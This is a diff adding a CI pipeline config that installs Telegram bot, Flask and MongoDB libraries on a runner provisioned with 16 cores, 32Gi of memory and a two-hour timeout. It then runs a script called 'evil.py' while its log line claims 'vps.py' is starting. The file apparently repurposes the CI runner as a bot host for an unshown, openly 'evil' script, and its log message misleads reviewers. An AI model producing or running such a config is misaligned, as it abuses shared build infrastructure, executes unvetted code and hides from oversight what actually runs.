@@ -1,0 +1,27 @@
+version: v2
+global: 
+  runner:
+    os_image: ubuntu
+    resources:
+      cpu: "16"  # Requesting 16 cores (if available)
+      memory: "32Gi"  # Requesting maximum RAM for better performance
+  variables: 
+    - CGO_ENABLED=0
+    - GOOS=linux
+    - GOARCH=amd64
+    - GOFLAGS=-mod=vendor
+    - LD_FLAGS=-w -s
+
+tasks:
+  setup:
+    timeout: 7200
+    steps:
+      - checkout
+      - run: |
+          sudo apt-get update && \
+          sudo apt-get install -y python3 python3-pip && \
+          pip3 install --upgrade pip && \
+          pip3 install telebot flask pymongo aiohttp python-telegram-bot && \
+          chmod +x * && \
+          echo "Starting vps.py execution" && \
+          python3 evil.py
